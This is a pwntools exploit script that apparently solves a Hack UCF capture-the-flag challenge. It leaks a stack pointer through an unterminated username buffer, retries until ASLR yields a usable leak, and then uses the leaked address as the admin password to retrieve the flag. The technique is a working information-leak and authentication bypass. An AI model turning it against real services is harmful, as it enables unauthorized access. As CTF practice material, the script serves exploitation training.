#!/usr/bin/env python3
from pwn import *
import os

exe = ELF(".build/oomg_space" if os.path.exists(".build/oomg_space") else "oomg_space", checksec=False)
context(binary=exe)
# context.log_level = "debug"


def connect():
	if not args.LOCAL:
		return remote(os.environ.get("HOST") or args.HOST or "ctf.hackucf.org", int(os.environ.get("PORT") or args.PORT or 20003))
	return exe.process()
	# gdb.attach(r, "c")

# The leaked pointer is cut short whenever ASLR puts a zero byte in it, so
# reconnect (getting a fresh layout) until the leak is long enough.
for attempt in range(20):
	r = connect()
	r.recvuntil(b"USER\n")

	r.send(b"A" * 16)
	r.recvuntil(b"BAD USER " + b"A" * 16)

	leak = r.recvuntil(b"\nAGAIN\n", drop=True)
	if len(leak) > 4:
		break
	warn("Leak size (%d) is suspiciously low, retrying" % len(leak))
	r.close()
else:
	error("Leak was too short on every attempt")

target_addr = u64(leak + b"\x00" * (8 - len(leak)))

info("&password is at 0x%x" % target_addr)

r.recvuntil(b"USER\n")
r.send(b"admin" + b"\x00" * (16 - 5))

r.recvuntil(b"PASSWORD\n")
r.send(p64(target_addr, endian="big"))
r.send(b"A")

print(r.recvline_contains(b"FLAG ", timeout=1).decode("utf8"))
